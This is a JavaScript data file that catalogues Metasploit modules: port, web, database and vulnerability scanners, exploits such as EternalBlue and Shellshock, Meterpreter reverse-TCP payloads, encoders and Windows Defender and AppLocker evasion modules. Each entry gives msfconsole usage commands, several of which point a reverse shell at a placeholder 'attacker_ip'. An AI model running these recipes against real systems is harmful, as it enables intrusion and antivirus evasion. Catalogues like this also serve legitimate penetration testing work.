const MODULES_DB = [
    // ===============================
    // AUXILIARY MODULES - SCANNERS
    // ===============================
    
    // PORT SCANNING MODULES
    {
        "name": "TCP Port Scanner",
        "path": "auxiliary/scanner/portscan/tcp",
        "category": "Port Scanning",
        "description": "Basic TCP port scanner to identify open ports",
        "targets": ["Any", "Network"],
        "tags": ["tcp", "port", "scan", "network", "reconnaissance"],
        "usage": "use auxiliary/scanner/portscan/tcp\nset RHOSTS target_ip\nset PORTS 1-1000\nrun",
        "options": ["RHOSTS", "PORTS", "THREADS", "TIMEOUT"]
    },
    {
        "name": "SYN Port Scanner",
        "path": "auxiliary/scanner/portscan/syn",
        "category": "Port Scanning",
        "description": "Fast SYN port scanner for stealth scanning",
        "targets": ["Any", "Network"],
        "tags": ["syn", "port", "scan", "stealth", "fast"],
        "usage": "use auxiliary/scanner/portscan/syn\nset RHOSTS target_ip\nset PORTS 1-65535\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE", "SNAPLEN"]
    },
    {
        "name": "ACK Port Scanner",
        "path": "auxiliary/scanner/portscan/ack",
        "category": "Port Scanning",
        "description": "ACK port scanner to identify filtered ports and firewall rules",
        "targets": ["Any", "Network"],
        "tags": ["ack", "port", "scan", "firewall", "filtered"],
        "usage": "use auxiliary/scanner/portscan/ack\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE"]
    },
    {
        "name": "UDP Port Scanner",
        "path": "auxiliary/scanner/discovery/udp_sweep",
        "category": "Port Scanning",
        "description": "UDP port scanner for discovering UDP services",
        "targets": ["Any", "Network"],
        "tags": ["udp", "port", "scan", "discovery"],
        "usage": "use auxiliary/scanner/discovery/udp_sweep\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PORTS", "THREADS"]
    },

    // WEB APPLICATION SCANNING
    {
        "name": "HTTP Version Scanner",
        "path": "auxiliary/scanner/http/http_version",
        "category": "Web Scanning",
        "description": "Scan for HTTP server version information",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "version", "web", "fingerprint"],
        "usage": "use auxiliary/scanner/http/http_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "VHOST", "SSL"]
    },
    {
        "name": "Directory Scanner",
        "path": "auxiliary/scanner/http/dir_scanner",
        "category": "Web Scanning",
        "description": "Scan for common directories on web servers",
        "targets": ["Web", "HTTP"],
        "tags": ["directory", "web", "enumeration", "brute-force"],
        "usage": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "PATH", "DICTIONARY"]
    },
    {
        "name": "WordPress Scanner",
        "path": "auxiliary/scanner/http/wordpress_scanner",
        "category": "Web Scanning",
        "description": "WordPress vulnerability scanner",
        "targets": ["Web", "WordPress"],
        "tags": ["wordpress", "cms", "vulnerability", "web"],
        "usage": "use auxiliary/scanner/http/wordpress_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "ENUMERATE"]
    },
    {
        "name": "SQL Injection Scanner",
        "path": "auxiliary/scanner/http/sql_injection",
        "category": "Web Scanning",
        "description": "Basic SQL injection vulnerability scanner",
        "targets": ["Web", "Database"],
        "tags": ["sql", "injection", "vulnerability", "web"],
        "usage": "use auxiliary/scanner/http/sql_injection\nset RHOSTS target_ip\nset TARGETURI /vulnerable.php\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "METHOD"]
    },

    // DATABASE SCANNING
    {
        "name": "MySQL Version Scanner",
        "path": "auxiliary/scanner/mysql/mysql_version",
        "category": "Database Scanning",
        "description": "Scan for MySQL version information",
        "targets": ["Database", "MySQL"],
        "tags": ["mysql", "database", "version", "fingerprint"],
        "usage": "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    {
        "name": "MySQL Login Scanner",
        "path": "auxiliary/scanner/mysql/mysql_login",
        "category": "Database Scanning",
        "description": "Brute force MySQL login credentials",
        "targets": ["Database", "MySQL"],
        "tags": ["mysql", "database", "login", "brute-force"],
        "usage": "use auxiliary/scanner/mysql/mysql_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE"]
    },

    // SMB/NETBIOS SCANNING
    {
        "name": "SMB Version Scanner",
        "path": "auxiliary/scanner/smb/smb_version",
        "category": "Service Scanning",
        "description": "Scan for SMB version information",
        "targets": ["Windows", "SMB"],
        "tags": ["smb", "windows", "version", "netbios"],
        "usage": "use auxiliary/scanner/smb/smb_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain"]
    },
    {
        "name": "SMB Share Scanner",
        "path": "auxiliary/scanner/smb/smb_enumshares",
        "category": "Service Scanning",
        "description": "Enumerate SMB shares on target systems",
        "targets": ["Windows", "SMB"],
        "tags": ["smb", "shares", "enumeration", "windows"],
        "usage": "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain", "ShowFiles"]
    },

    // ===============================
    // VULNERABILITY SCANNERS
    // ===============================
    
    {
        "name": "MS17-010 EternalBlue Scanner",
        "path": "auxiliary/scanner/smb/smb_ms17_010",
        "category": "Vulnerability Scanning",
        "description": "Scan for MS17-010 EternalBlue vulnerability",
        "targets": ["Windows", "SMB"],
        "tags": ["ms17-010", "eternalblue", "smb", "vulnerability"],
        "usage": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "CHECK_ARCH", "CHECK_DOPU", "CHECK_PIPE"]
    },
    {
        "name": "OpenSSL Heartbleed Scanner",
        "path": "auxiliary/scanner/ssl/openssl_heartbleed",
        "category": "Vulnerability Scanning",
        "description": "Scan for OpenSSL Heartbleed vulnerability (CVE-2014-0160)",
        "targets": ["SSL", "TLS", "Any"],
        "tags": ["heartbleed", "ssl", "tls", "cve-2014-0160"],
        "usage": "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TLS_CALLBACK", "TLS_VERSION"]
    },
    {
        "name": "Log4Shell Scanner",
        "path": "auxiliary/scanner/http/log4shell_scanner",
        "category": "Vulnerability Scanning",
        "description": "Scan for Log4Shell vulnerability (CVE-2021-44228)",
        "targets": ["Web", "Java"],
        "tags": ["log4j", "log4shell", "java", "cve-2021-44228"],
        "usage": "use auxiliary/scanner/http/log4shell_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "LDAP_URL"]
    },

    // ===============================
    // EXPLOIT MODULES
    // ===============================
    
    // WINDOWS EXPLOITS
    {
        "name": "EternalBlue Exploit",
        "path": "exploit/windows/smb/ms17_010_eternalblue",
        "category": "Windows Exploits",
        "description": "Exploit MS17-010 EternalBlue vulnerability for remote code execution",
        "targets": ["Windows", "SMB"],
        "tags": ["ms17-010", "eternalblue", "rce", "smb"],
        "usage": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nrun",
        "options": ["RHOSTS", "RPORT", "GroomAllocations", "GroomDelta"]
    },
    {
        "name": "MS08-067 NetAPI Exploit",
        "path": "exploit/windows/smb/ms08_067_netapi",
        "category": "Windows Exploits",
        "description": "MS08-067 Microsoft Server Service Relative Path Stack Corruption",
        "targets": ["Windows", "SMB"],
        "tags": ["ms08-067", "netapi", "smb", "rce"],
        "usage": "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS target_ip\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": ["RHOSTS", "RPORT", "SMBPIPE"]
    },

    // LINUX EXPLOITS
    {
        "name": "Shellshock CGI Exploit",
        "path": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "category": "Linux Exploits",
        "description": "Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)",
        "targets": ["Linux", "Unix", "Web"],
        "tags": ["shellshock", "bash", "cgi", "rce"],
        "usage": "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target_ip\nset TARGETURI /cgi-bin/vulnerable.cgi\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "METHOD"]
    },

    // WEB APPLICATION EXPLOITS
    {
        "name": "Struts2 DevMode OGNL Execution",
        "path": "exploit/multi/http/struts2_devmode",
        "category": "Web Exploits",
        "description": "Apache Struts 2 Developer Mode OGNL Execution",
        "targets": ["Web", "Java"],
        "tags": ["struts2", "ognl", "java", "rce"],
        "usage": "use exploit/multi/http/struts2_devmode\nset RHOSTS target_ip\nset TARGETURI /struts2-showcase/\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },

    // ===============================
    // PAYLOAD MODULES
    // ===============================
    
    // WINDOWS PAYLOADS
    {
        "name": "Windows Meterpreter Reverse TCP",
        "path": "payload/windows/meterpreter/reverse_tcp",
        "category": "Windows Payloads",
        "description": "Windows Meterpreter (Reflective Injection), Reverse TCP Stager",
        "targets": ["Windows"],
        "tags": ["meterpreter", "reverse", "tcp", "windows"],
        "usage": "set payload windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT", "EXITFUNC"]
    },
    {
        "name": "Windows x64 Meterpreter Reverse TCP",
        "path": "payload/windows/x64/meterpreter/reverse_tcp",
        "category": "Windows Payloads",
        "description": "Windows x64 Meterpreter (Reflective Injection), Reverse TCP Stager",
        "targets": ["Windows"],
        "tags": ["meterpreter", "reverse", "tcp", "windows", "x64"],
        "usage": "set payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT", "EXITFUNC"]
    },

    // LINUX PAYLOADS
    {
        "name": "Linux x64 Meterpreter Reverse TCP",
        "path": "payload/linux/x64/meterpreter/reverse_tcp",
        "category": "Linux Payloads",
        "description": "Linux Mettle x64, Reverse TCP Stager",
        "targets": ["Linux"],
        "tags": ["meterpreter", "reverse", "tcp", "linux", "x64"],
        "usage": "set payload linux/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT"]
    },

    // WEB PAYLOADS
    {
        "name": "PHP Meterpreter Reverse TCP",
        "path": "payload/php/meterpreter/reverse_tcp",
        "category": "Web Payloads",
        "description": "PHP Meterpreter, Reverse TCP Stager",
        "targets": ["PHP", "Web"],
        "tags": ["php", "meterpreter", "reverse", "tcp", "web"],
        "usage": "set payload php/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT"]
    },

    // ===============================
    // ENCODER MODULES
    // ===============================
    
    {
        "name": "x86 Shikata Ga Nai",
        "path": "encoder/x86/shikata_ga_nai",
        "category": "Encoders",
        "description": "Polymorphic XOR Additive Feedback Encoder",
        "targets": ["x86", "Windows", "Linux"],
        "tags": ["encoder", "polymorphic", "xor", "x86"],
        "usage": "set encoder x86/shikata_ga_nai\ngenerate",
        "options": ["BufferRegister", "ClearDirection", "PrependEncoder"]
    },
    {
        "name": "x64 XOR Dynamic",
        "path": "encoder/x64/xor_dynamic",
        "category": "Encoders",
        "description": "Dynamic key XOR Encoder",
        "targets": ["x64", "Windows", "Linux"],
        "tags": ["encoder", "xor", "dynamic", "x64"],
        "usage": "set encoder x64/xor_dynamic\ngenerate",
        "options": ["BufferRegister"]
    },

    // ===============================
    // EVASION MODULES
    // ===============================
    
    {
        "name": "Windows Defender Evasion",
        "path": "evasion/windows/windows_defender_exe",
        "category": "Evasion",
        "description": "Microsoft Windows Defender Evasive Executable",
        "targets": ["Windows"],
        "tags": ["evasion", "windows-defender", "antivirus", "exe"],
        "usage": "use evasion/windows/windows_defender_exe\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": ["FILENAME", "TEMPLATE"]
    },
    {
        "name": "Applocker Evasion",
        "path": "evasion/windows/applocker_evasion_install_util",
        "category": "Evasion",
        "description": "AppLocker Evasion - InstallUtil",
        "targets": ["Windows"],
        "tags": ["evasion", "applocker", "installutil", "bypass"],
        "usage": "use evasion/windows/applocker_evasion_install_util\nset payload windows/meterpreter/reverse_tcp\nrun",
        "options": ["FILENAME"]
    }
];
